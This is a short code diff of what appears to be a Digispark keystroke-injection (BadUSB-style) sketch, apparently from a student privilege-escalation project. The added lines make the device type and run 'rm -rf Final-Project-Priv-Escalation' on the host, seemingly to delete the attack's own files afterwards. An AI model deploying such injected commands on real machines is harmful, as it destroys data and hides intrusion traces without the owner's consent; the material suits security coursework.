@@ -29,6 +29,8 @@ void setup() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.print("cd ../..");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("rm -rf Final-Project-Priv-Escalation");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     
 
